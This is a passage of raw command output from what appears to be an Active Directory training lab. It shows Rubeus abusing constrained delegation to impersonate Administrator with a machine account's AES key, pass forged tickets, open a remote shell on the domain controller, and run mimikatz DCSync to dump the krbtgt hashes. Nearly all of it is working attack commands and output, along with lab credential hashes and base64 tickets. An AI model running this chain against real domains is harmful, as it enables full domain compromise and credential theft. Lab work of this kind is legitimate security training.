      VtbOm72qAKMHFu7KzqlnaQXYzILjvrz8B/qt+5lcWLfiJvv6XfdtdJm/IZD9U3fE6w6K2mXyU91eYtm5
      /Ij60qosdFOoJ3o1wfbclVZ3fEMbsdnJRGph5JXOPEnbGq8CKdq/YNW0Z9oMJS5HTJLh020WXweX0Ix+
      ZUjS5Vvwwsy5YiQLkuzUeEe4OBpRgzS6rRnSimWwKaHOj5puJD3Q6wFJqv3Pd8TbXbm8HYK4uNjIPQYe
      wEobk4eoUB18fW0UIt1wC9sqqDbsj4hopdyN+0DyGkxfFqwPh3+B9Go0O93LFBrnsgaHV7PaP0aQ8w2n
      WP3m5n9VQNqfIOlH95rs0t0sr7/izppZl0rjxLkMRySpjjkNe0SBbNL//t5U27AZR6zjE7siYIytzjJI
      J6QK+Fwnki/qIFqFlkpWOzziHt0OOx6HYA2HhaI7bL3fdlEJDGKfCPJbt3X9JybUQ6OCAQIwgf+gAwIB
      AKKB9wSB9H2B8TCB7qCB6zCB6DCB5aArMCmgAwIBEqEiBCDP3abGX7tygOJaBuOs0Cpo0VmjJv+X8oOy
      MYwnyu/AMaEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBCqERMA8bDUFkbWluaXN0
      cmF0b3KjBwMFAEChAAClERgPMjAyMzA1MDIxNzIzMjlaphEYDzIwMjMwNTAzMDMyMzI4WqcRGA8yMDIz
      MDUwOTE3MjMyOFqoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypHDAaoAMCAQGhEzARGw9kY29y
      cC1hZG1pbnNydiQ=

[*] Impersonating user 'Administrator' to target SPN 'TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*]   Final ticket will be for the alternate service 'HTTP'
[*] Building S4U2proxy request for service: 'TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'HTTP'
[*] base64(ticket.kirbi) for SPN 'HTTP/dcorp-dc.dollarcorp.moneycorp.LOCAL':

      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
[+] Ticket successfully imported!

C:\Windows\system32>winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
```

With alternative service ldap for dcsync:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-adminsrv$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGazCCBmegAwIBBaEDAgEWooIFODCCBTRhggUwMIIFLKADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC
      BNQwggTQoAMCARKhAwIBAqKCBMIEggS+lqsNIZUJxtyuPx44YwPlXgNbvbta0LnnkxvSXKH7W/Zq//Nt
      vMelAefRxNjXlGT9dOL4X/jRnSUSclrEQQo8/wEgoVTafREEpoDIoxV7u2WjabSQXUTdajFpvCcw1wXA
      rXKQuhrJDithNWXDqSVIdx4MMeVGGRCLafVF1cUg7o2aYWiCHtoZT4PU5NFz7KHwXOsQzZc6sRu8ZiVY
      6eKg00qPHBzHHryoxq2QuxxWDLU2yMT9GDbjraTRrVHXFKBtKQlSepNxweJPiJJdLxWlDrj2mTatAs/K
      bhU3N0QmNLKtoY/wwEPqiXEdy7bh+n/KtKrq1SSq3y5nY7jZMgK6NGwOOKI6T9m8rdgNiE1Nq+Tlcb1Z
      F+4N38vgMCfCTiyZTj5jVC765UcbCpmv6wQBXE+TKj9Q7sAKunFtIQ3qQGPAiQ2nuLl89q9XKeqnVvT4
      aG07mHOYzfFeHatkZIfP24xzrOtU0i+T5cZPB8YN6Wf6dyEfBzM7GTt3wAo47kTTz2HX6MIFi5/Qdi/S
      LvHl59gVqLeKRJJGE+A1fU2CmH22QjmeHym3pm5hgQYBecKmG6aq4i3psSkP4ni1hCsK+yTDWSxE8FLF
      wqSsBkQIwkWvDBBU0l8ypSk7sCKfb0dOpX0Osdt3IzQI56J6tjGhNzvYAUNoK0+GWjJGJLst8DjnIZ0A
      VnUAgEVEossEpJeJO5HIr7B9EG7GGQeJVimupktUsMGpuoB+z09ITOeoxeaFv0M1+rsiYtTQFGAaTwD8
      mZfx8dK+R4/N/PuvMKwIhBzI/9Ph9tFBPRdvKlsuShi1fyMp4rEA5GrMdjEFeDB2Z22/KuMHeVQut8Ux
      8GGNh9i1meu404FP7ZHeSkQZ3LcVbAGgnF1nRiPWQYyt1L21+soa6HGv7x4Nf5CN0EOpUKQciVtF7TEj
      SV8MggJk5zx3QdtFIrNoHjXqk4CKwISEznSOQ2UZaDZrjkQyhvruH/f1jUU750F2iEjJyasIgmglWZKh
      u69uL0XWcCNRpfOcFDqaNfcNpIDNd1d1iPQkI7gs+/07SUbKHWCaRwW3IbPS7hwxDmbXm6H8koxn6IVV
      s4O/dDvn7INXxf4+bsJB7MhMAWpSSWhHb0tbDoYtHiyYJaqNC5tobYcFh9KeVW40X/xle6RKyOK8Ljk2
      xGMJxTGMvwpoRl2mdWD8KedUNaLR8fEdf8ZKzE+qG44W8vn1ViRe9KDlKPMaaWHSTW8uKniNiIiVOPx2
      bKzqsOW0087WJ0hnCnKF20rYps8sZXnmTsU9jsfzTy98qPei2ES7B0saTSP/GfK002xRW4Q2OPCVRzgv
      OvEF9VfXjOOL31WgMI84i3JgUUlzHzHjBxauHh4dUdXAD3/8GxTeRAcDI/AMQUd6/S5qAzxRM+NrQt2S
      X+yD7zwtNtCKU6txIwUstMtoAAK1j3Rpf+etY585lX2plDmTRIyU4UuN7o4u/UrFyBvKx5YrhpKJpc/n
      uvB2ErfMUmJS4CrX3KsPz1OAXs3HYUKI0XEJnb/KfqQ+iM8OXPAozLKFVfqsbVw1uKpMnXQNt7k11Agd
      SudGZ2X/rmDjLxjFs46J/SMWHlH/aItyeAfLDDAuNsCHckAJx1SjggEdMIIBGaADAgEAooIBEASCAQx9
      ggEIMIIBBKCCAQAwgf0wgfqgKzApoAMCARKhIgQgljP7TDm9D+UnUmR8RNPf2FjP5vN/X8Ry/vnSqJ/Y
      ATWhHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiHDAaoAMCAQGhEzARGw9kY29ycC1hZG1pbnNy
      diSjBwMFAEDhAAClERgPMjAyMzA1MDIxNzI1MjBaphEYDzIwMjMwNTAzMDMyNTIwWqcRGA8yMDIzMDUw
      OTE3MjUyMFqoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypLzAtoAMCAQKhJjAkGwZrcmJ0Z3Qb
      GmRvbGxhcmNvcnAubW9uZXljb3JwLmxvY2Fs


[*] Action: S4U

[*] Building S4U2self request for: 'dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      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
      cC1hZG1pbnNydiQ=

[*] Impersonating user 'Administrator' to target SPN 'TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'
[*] base64(ticket.kirbi) for SPN 'ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL':

      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
[+] Ticket successfully imported!

C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "privilge::debug" "lsadump::dcsync /user:dcorp\krbtgt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilge::debug
ERROR mimikatz_doLocal ; "privilge" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
             ngc  -  Next Generation Cryptography module (kiwi use only)  [Some commands to enumerate credentials...]
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
       busylight  -  BusyLight Module
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module

mimikatz(commandline) # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 150ea2e934ab6b80

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  a0e60e247b498de4cacfac3ba615af01
    02  86615bb9bf7e3c731ba1cb47aa89cf6d
    03  637dfb61467fdb4f176fe844fd260bac
    04  a0e60e247b498de4cacfac3ba615af01
    05  86615bb9bf7e3c731ba1cb47aa89cf6d
    06  d2874f937df1fd2b05f528c6e715ac7a
    07  a0e60e247b498de4cacfac3ba615af01
    08  e8ddc0d55ac23e847837791743b89d22
    09  e8ddc0d55ac23e847837791743b89d22
    10  5c324b8ab38cfca7542d5befb9849fd9
    11  f84dfb60f743b1368ea571504e34863a
    12  e8ddc0d55ac23e847837791743b89d22
    13  2281b35faded13ae4d78e33a1ef26933
    14  f84dfb60f743b1368ea571504e34863a
    15  d9ef5ed74ef473e89a570a10a706813e
    16  d9ef5ed74ef473e89a570a10a706813e
    17  87c75daa20ad259a6f783d61602086aa
    18  f0016c07fcff7d479633e8998c75bcf7
    19  7c4e5eb0d5d517f945cf22d74fec380e
    20  cb97816ac064a567fe37e8e8c863f2a7
    21  5adaa49a00f2803658c71f617031b385
    22  5adaa49a00f2803658c71f617031b385
    23  6d86f0be7751c8607e4b47912115bef2
    24  caa61bbf6b9c871af646935febf86b95
    25  caa61bbf6b9c871af646935febf86b95
    26  5d8e8f8f63b3bb6dd48db5d0352c194c
    27  3e139d350a9063db51226cfab9e42aa1
    28  d745c0538c8fd103d71229b017a987ce
    29  40b43724fa76e22b0d610d656fb49ddd


mimikatz(commandline) # exit
Bye!

```
